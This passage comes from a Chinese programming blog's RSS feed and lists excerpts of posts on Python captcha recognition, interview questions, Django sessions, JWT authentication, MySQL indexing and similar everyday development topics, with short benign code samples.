&lt;!-- raw HTML omitted --&gt;</description>
    </item>
    
    <item>
      <title>python验证码识别3:滑动验证码</title>
      <link>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB3/</link>
      <pubDate>Thu, 21 Sep 2017 20:38:00 +0000</pubDate>
      
      <guid>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB3/</guid>
      <description>&lt;p&gt;上篇文章记录了2种分割验证码的方法，此外还有一种叫做&amp;quot;滴水算法&amp;rdquo;(Drop Fall Algorithm)的方法，但本人智商原因看这个算法看的云里雾里的，所以今天记录滑动验证码的处理吧。网上据说有大神已经破解了滑动验证码的算法，可以不使用selenium来破解，但本人能力不足还是使用笨方法吧。&lt;/p&gt;
&lt;p&gt;基础原理很简单，首先点击验证码按钮后的图片是滑动后的完整结果，点击一下滑块后会出现拼图，对这2个分别截图后比较像素值来找出滑动距离，并结合selenium来实现拖拽效果。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>python验证码识别2:投影法、连通域法分割图片</title>
      <link>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB2/</link>
      <pubDate>Wed, 20 Sep 2017 10:45:10 +0000</pubDate>
      
      <guid>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB2/</guid>
      <description>&lt;p&gt;今天这篇文章主要记录一下如何切分验证码，用到的主要库就是&lt;code&gt;Pillow&lt;/code&gt;和Linux下的图像处理工具GIMP。首先假设一个固定位置和宽度、无粘连、无干扰的例子学习一下如何使用&lt;code&gt;Pillow&lt;/code&gt;来切割图片。&lt;/p&gt;
&lt;p&gt;使用GIMP打开图片后，按 &lt;em&gt;加号&lt;/em&gt; 放大图片，然后点击&lt;code&gt;View-&amp;gt;Show Grid&lt;/code&gt;来显示网格线：&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;其中，每个正方形边长为10像素，所以数字1切割坐标为左20、上20、右40、下70。以此类推可以知道剩下3个数字的切割位置。代码如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; PIL &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Image
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Image&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.png&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 注意位置顺序为左、上、右、下&lt;/span&gt;
cuts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [(&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;),(&lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;),(&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;130&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;),(&lt;span style=&#34;color:#ae81ff&#34;&gt;140&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;170&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;)]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i,n &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(cuts,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
    temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;crop(n) &lt;span style=&#34;color:#75715e&#34;&gt;# 调用crop函数进行切割&lt;/span&gt;
    temp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;save(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cut&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.png&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;切割后得到4张图片：&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;那么，如果字符位置不固定怎么办呢？现在假设一种随机位置宽度、无粘连、无干扰线的情况。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>python验证码识别1:灰度处理、二值化、降噪、tesserocr识别</title>
      <link>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</link>
      <pubDate>Tue, 19 Sep 2017 10:21:03 +0000</pubDate>
      
      <guid>/posts/python%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</guid>
      <description>&lt;p&gt;写爬虫有一个绕不过去的问题就是验证码，现在验证码分类大概有4种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;图像类&lt;/li&gt;
&lt;li&gt;滑动类&lt;/li&gt;
&lt;li&gt;点击类&lt;/li&gt;
&lt;li&gt;语音类&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;今天先来看看图像类，这类验证码大多是数字、字母的组合，国内也有使用汉字的。在这个基础上增加噪点、干扰线、变形、重叠、不同字体颜色等方法来增加识别难度。
相应的，验证码识别大体可以分为下面几个步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;灰度处理&lt;/li&gt;
&lt;li&gt;增加对比度(可选)&lt;/li&gt;
&lt;li&gt;二值化&lt;/li&gt;
&lt;li&gt;降噪&lt;/li&gt;
&lt;li&gt;倾斜校正分割字符&lt;/li&gt;
&lt;li&gt;建立训练库&lt;/li&gt;
&lt;li&gt;识别&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>Python面试题2</title>
      <link>/posts/python%E9%9D%A2%E8%AF%95%E9%A2%982/</link>
      <pubDate>Fri, 18 Aug 2017 15:05:13 +0000</pubDate>
      
      <guid>/posts/python%E9%9D%A2%E8%AF%95%E9%A2%982/</guid>
      <description>&lt;p&gt;最近面试了几家公司，各行各业的都有，涨了很多见识也发现了自己的技术盲点。这里来一个汇总简单纪录。&lt;/p&gt;
&lt;h1 id=&#34;行列转换&#34;&gt;行列转换&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;已知有一个二维列表&lt;/span&gt;(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;每一行的元素个数相同&lt;/span&gt;)&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;，写出函数对其行列转换并输出，比如：&lt;/span&gt;
a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
     [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]]
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;输出：&lt;/span&gt;
[
[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],
[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],
[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],
[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里建议笔试时候尽量使用简单清晰的写法，让面试官一眼就能看出答案对错：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;convert&lt;/span&gt;(alist):
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(alist[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])):
        tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(alist)):
            tmp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(alist[y][x])
        result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(tmp)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; result
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>django中的Session和Cookie</title>
      <link>/posts/django%E4%B8%AD%E7%9A%84session%E5%92%8Ccookie/</link>
      <pubDate>Fri, 28 Jul 2017 11:55:08 +0000</pubDate>
      
      <guid>/posts/django%E4%B8%AD%E7%9A%84session%E5%92%8Ccookie/</guid>
      <description>&lt;p&gt;简单来说，Cookie和Session都是为了记录用户相关信息的方式，最大的区别就是Cookie在客户端记录而Session在服务端记录内容。&lt;/p&gt;
&lt;p&gt;那么Cookie和Session之间的联系是怎么建立的呢？换言之，当服务器接收到一个请求时候，根据什么来判断读取哪个Session的呢？&lt;/p&gt;
&lt;p&gt;对于Django默认情况来说，当用户登录后就可以发现Cookie里有一个&lt;code&gt;sessionid&lt;/code&gt;的字段，根据这个key就可以取得在服务器端记录的详细内容。如果将这个字段删除，刷新页面就会发现变成未登录状态了。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Pyflame安装小记</title>
      <link>/posts/pyflame%E5%AE%89%E8%A3%85%E5%B0%8F%E8%AE%B0/</link>
      <pubDate>Wed, 26 Jul 2017 13:12:06 +0000</pubDate>
      
      <guid>/posts/pyflame%E5%AE%89%E8%A3%85%E5%B0%8F%E8%AE%B0/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://www.brendangregg.com/flamegraphs.html&#34;&gt;火焰图&lt;/a&gt;是一款性能调优工具，可以清晰的看出程序运行瓶颈在哪里。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://pyflame.readthedocs.io/en/latest/&#34;&gt;pyflame&lt;/a&gt;则是由Uber开源出来的针对python程序生成火焰图的工具。&lt;/p&gt;
&lt;p&gt;这里记录一下安装过程以及遇到的错误。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>MySQL索引优化小记</title>
      <link>/posts/mysql%E7%B4%A2%E5%BC%95%E4%BC%98%E5%8C%96%E5%B0%8F%E8%AE%B0/</link>
      <pubDate>Mon, 24 Jul 2017 14:40:04 +0000</pubDate>
      
      <guid>/posts/mysql%E7%B4%A2%E5%BC%95%E4%BC%98%E5%8C%96%E5%B0%8F%E8%AE%B0/</guid>
      <description>&lt;p&gt;有2种数据类型，一种重复率高、一种重复率低，选择这2种类型哪个建立索引好？为什么？&lt;/p&gt;
&lt;p&gt;之前确实没考虑过这个问题，但觉得既然是使用空间换时间，数据结构本身重复率那么高索引的作用应该就不大了吧。&lt;/p&gt;
&lt;p&gt;后来结束到家查看资料后，发现这个名词叫做&amp;quot;离散率&amp;rdquo;。对于DBA这个问题应该是最最基础的了。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>几道python面试题</title>
      <link>/posts/%E5%87%A0%E9%81%93python%E9%9D%A2%E8%AF%95%E9%A2%98/</link>
      <pubDate>Fri, 21 Jul 2017 09:41:36 +0000</pubDate>
      
      <guid>/posts/%E5%87%A0%E9%81%93python%E9%9D%A2%E8%AF%95%E9%A2%98/</guid>
      <description>&lt;p&gt;前几天去笔试，这里记录一下遇到的几个编程题，比较基础。&lt;/p&gt;
&lt;h1 id=&#34;生成斐波那契数列并取前10项&#34;&gt;生成斐波那契数列并取前10项&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt;(m):
  n,a,b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; m:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; a
    a,b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b,a&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;b
    n &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; one &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; func(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;):
  &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; one
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个可以说是一道常见的简单算法题了，关键点就是理解&lt;code&gt;a,b=b,a+b&lt;/code&gt;以及yield的作用。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Python常见操作时间复杂度</title>
      <link>/posts/python%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6/</link>
      <pubDate>Sun, 16 Jul 2017 10:57:46 +0000</pubDate>
      
      <guid>/posts/python%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6/</guid>
      <description>&lt;p&gt;电话面试被问到了几个python常见操作的时间复杂度问题，这几年一直关注在业务逻辑的实现上这类基础反而记得不太清楚了，这里有必要重新复习一下，完整版：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://wiki.python.org/moin/TimeComplexity&#34; title=&#34;TimeComplexity&#34;&gt;TimeComplexity&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>fedora25批量转换NEF为JPG</title>
      <link>/posts/fedora25%E6%89%B9%E9%87%8F%E8%BD%AC%E6%8D%A2nef%E4%B8%BAjpg/</link>
      <pubDate>Tue, 02 May 2017 17:54:53 +0000</pubDate>
      
      <guid>/posts/fedora25%E6%89%B9%E9%87%8F%E8%BD%AC%E6%8D%A2nef%E4%B8%BAjpg/</guid>
      <description>NEF格式是尼康相机的RAW拍摄照片格式，在Linux上转换NEF为JPG格式需要安装2个软件：
yum install ufrawyum install ImageMagick安装完成后，可以使用convert DSC_0300.NEF test.jpg命令来进行单张转换，如果需要转换的图片很多的话，建议使用以下命令多进程处理：</description>
    </item>
    
    <item>
      <title>解决apahce部署python程序503错误</title>
      <link>/posts/%E8%A7%A3%E5%86%B3apahce%E9%83%A8%E7%BD%B2python%E7%A8%8B%E5%BA%8F503%E9%94%99%E8%AF%AF/</link>
      <pubDate>Thu, 13 Apr 2017 11:30:09 +0000</pubDate>
      
      <guid>/posts/%E8%A7%A3%E5%86%B3apahce%E9%83%A8%E7%BD%B2python%E7%A8%8B%E5%BA%8F503%E9%94%99%E8%AF%AF/</guid>
      <description>今天更新服务器后，发现使用apache部署的某个python程序无法访问了，返回503错误，报错日志如下：
[Thu Apr 13 10:54:40 2017] [error] [client 127.0.0.1] (13)Permission denied: mod_wsgi (pid=1814): Unable to connect to WSGI daemon process &#39;trac&#39; on &#39;/etc/httpd/logs/wsgi.</description>
    </item>
    
    <item>
      <title>numpy学习笔记</title>
      <link>/posts/numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Mon, 06 Mar 2017 11:09:19 +0000</pubDate>
      
      <guid>/posts/numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.scipy.org/doc/numpy-dev/user/quickstart.html&#34;&gt;Numpy&lt;/a&gt;(发音&amp;quot;南派&amp;quot;而不是&amp;quot;努屁&amp;rdquo;)是一款用来进行科学计算的python库，可以方便快速的计算平均值、最大值、最小值、方差、标准差、向量运行等。相关库还有
&lt;code&gt;Pandas&lt;/code&gt;,&lt;code&gt;Scypi&lt;/code&gt;等。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>django-rest-jwt认证</title>
      <link>/posts/django-rest-jwt%E8%AE%A4%E8%AF%81/</link>
      <pubDate>Wed, 11 Jan 2017 10:37:34 +0000</pubDate>
      
      <guid>/posts/django-rest-jwt%E8%AE%A4%E8%AF%81/</guid>
      <description>&lt;p&gt;关于JWT(Json Web Token)是一种较新的用户认证方式，官网在&lt;a href=&#34;https://jwt.io/&#34;&gt;这里&lt;/a&gt;，网上有篇中文解释写的很好，&lt;a href=&#34;http://blog.leapoahead.com/2015/09/06/understanding-jwt/&#34;&gt;点此跳转&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;用户认证(Authentication)和用户授权(Authorization)是两个不同的概念，认证解决的是“有没有”的问题，而授权解决的是“能不能”的问题。&lt;/p&gt;
&lt;p&gt;一般用到JWT认证的情况大多都是配合REST框架使用，比如我大Django的Django-REST-framework框架，就已经有了现成的三方库&lt;a href=&#34;http://getblimp.github.io/django-rest-framework-jwt/&#34;&gt;django-rest-framework-jwt&lt;/a&gt;。不过这个库默认只支持基于&lt;code&gt;Header&lt;/code&gt;传递信息，所以改成基于Cookie方式还需要我们来手动处理一下。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>什么时候不使用箭头函数</title>
      <link>/posts/%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%B8%8D%E4%BD%BF%E7%94%A8%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 22 Dec 2016 17:07:08 +0000</pubDate>
      
      <guid>/posts/%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%B8%8D%E4%BD%BF%E7%94%A8%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/</guid>
      <description>&lt;p&gt;作为一个前端渣渣，最近在写js代码的时候，开始使用一些ES6的新特性，结果到箭头函数部分“掉坑”了。网上大部分都说箭头函数怎么用，而很少说箭头什么时候 &lt;em&gt;不要用&lt;/em&gt;，所以这里翻译一篇文章来说说什么时候不要用的问题。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://rainsoft.io/when-not-to-use-arrow-functions-in-javascript/&#34;&gt;原文地址&lt;/a&gt;，向原作者表示感谢。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>将Django模板变量传递给外部JS调用的几种方式</title>
      <link>/posts/%E5%B0%86django%E6%A8%A1%E6%9D%BF%E5%8F%98%E9%87%8F%E4%BC%A0%E9%80%92%E7%BB%99%E5%A4%96%E9%83%A8js%E8%B0%83%E7%94%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</link>
      <pubDate>Tue, 20 Dec 2016 11:55:19 +0000</pubDate>
      
      <guid>/posts/%E5%B0%86django%E6%A8%A1%E6%9D%BF%E5%8F%98%E9%87%8F%E4%BC%A0%E9%80%92%E7%BB%99%E5%A4%96%E9%83%A8js%E8%B0%83%E7%94%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</guid>
      <description>&lt;p&gt;最近一直在思考如何更好的组织Django中的静态资源，比如JS、CSS一类，如何结合前端构建工具写出更好的代码以及结构呢？&lt;/p&gt;
&lt;p&gt;首先需要解决的一个问题就是某些时候需要把JS代码写在模板里来获取后台传递过来的变量，比如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;Test&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;my-test&amp;#34;&lt;/span&gt; &amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(){
  &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;#my-test&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;html&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{{ some_var_from_view }}&amp;#34;&lt;/span&gt;)
});
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这么写代码的话，别扭不说，前端的那些构建工具比如webpack，gulp的使用范围也将大大降低。&lt;/p&gt;
&lt;p&gt;首先说结论，想完全剥离JS和模板而又需要使用模板渲染的数据，我是没想到什么好办法。如果读者有好办法希望赐教。
既然不能完全剥离，那么就进最大的努力分离JS所需的数据和代码吧。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>我特么是如何利用Django, Django REST Framework, Angular 1.1.x和Webpack构建一个项目的</title>
      <link>/posts/%E6%88%91%E7%89%B9%E4%B9%88%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8django-django-rest-framework-angular-1-1-x%E5%92%8Cwebpack%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E7%9A%84/</link>
      <pubDate>Tue, 08 Nov 2016 13:50:46 +0000</pubDate>
      
      <guid>/posts/%E6%88%91%E7%89%B9%E4%B9%88%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8django-django-rest-framework-angular-1-1-x%E5%92%8Cwebpack%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E7%9A%84/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://gregblogs.com/how-the-do-i-build-a-django-django-rest-framework-angular-1-1-x-and-webpack-project/#prereq&#34;&gt;原文地址&lt;/a&gt;，向原作者表示感谢。由于本人并没学习过angular，所以翻译有误的地方恳请指正。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;我已经受够了JS社区的那帮二货，我只是想使用Django作为后端结合Angular做一个简单的、可复用的项目，却没有一个简明的指导教我如何做到。如果你也为此挣扎，这里有一份指南教你如何构建一个由Django作为后端、Webpack进行组织的Angular程序。&lt;/p&gt;
&lt;h2 id=&#34;问题&#34;&gt;问题&lt;/h2&gt;
&lt;p&gt;我想开发一个Angular1.1.x的项目并使用Django作为后端提供数据，我喜欢使用Django REST Framework(DRF)来构造RESTful API。我也想打包需要的JavaScript资源。目前，我打算使用单一的服务器上运行这个程序。&lt;/p&gt;
&lt;h2 id=&#34;依赖&#34;&gt;依赖&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Python 2.x&lt;/li&gt;
&lt;li&gt;a virtual Python environment&lt;/li&gt;
&lt;li&gt;Django 1.9.x (pip install django)&lt;/li&gt;
&lt;li&gt;npm 2.15.8+&lt;/li&gt;
&lt;li&gt;Webpack 1.13.x (sudo npm i -g webpack)&lt;/li&gt;
&lt;li&gt;ESLint 2.13.1+ (sudo npm i -g eslint)&lt;/li&gt;
&lt;li&gt;NodeJS 4.4.7+&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>django解析用户上传的excel文件</title>
      <link>/posts/django%E8%A7%A3%E6%9E%90%E7%94%A8%E6%88%B7%E4%B8%8A%E4%BC%A0%E7%9A%84excel%E6%96%87%E4%BB%B6/</link>
      <pubDate>Thu, 13 Oct 2016 09:09:46 +0000</pubDate>
      
      <guid>/posts/django%E8%A7%A3%E6%9E%90%E7%94%A8%E6%88%B7%E4%B8%8A%E4%BC%A0%E7%9A%84excel%E6%96%87%E4%BB%B6/</guid>
      <description>有些时候我们会有这种需求：用户上传一个格式固定excel表格到网站上，然后程序负债解析内容并进行处理。 举一个简单的栗子，比如我们有这样一个HTML：
&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;p&amp;gt;上传EXCEL表格&amp;lt;/p&amp;gt;&amp;lt;form class=&amp;#34;&amp;#34; action=&amp;#34;&amp;#34; method=&amp;#34;post&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34; &amp;gt;{% csrf_token %}&amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;excel&amp;#34;&amp;gt;&amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;上传&amp;#34;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;forms.</description>
    </item>
    
    <item>
      <title>使用python模拟POST请求提交图片</title>
      <link>/posts/%E4%BD%BF%E7%94%A8python%E6%A8%A1%E6%8B%9Fpost%E8%AF%B7%E6%B1%82%E6%8F%90%E4%BA%A4%E5%9B%BE%E7%89%87/</link>
      <pubDate>Wed, 14 Sep 2016 09:54:37 +0000</pubDate>
      
      <guid>/posts/%E4%BD%BF%E7%94%A8python%E6%A8%A1%E6%8B%9Fpost%E8%AF%B7%E6%B1%82%E6%8F%90%E4%BA%A4%E5%9B%BE%E7%89%87/</guid>
      <description>&lt;p&gt;使用requests来模拟HTTP请求本来是一件非常轻松的事情，比如上传图片来说，简单的几行代码即可：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
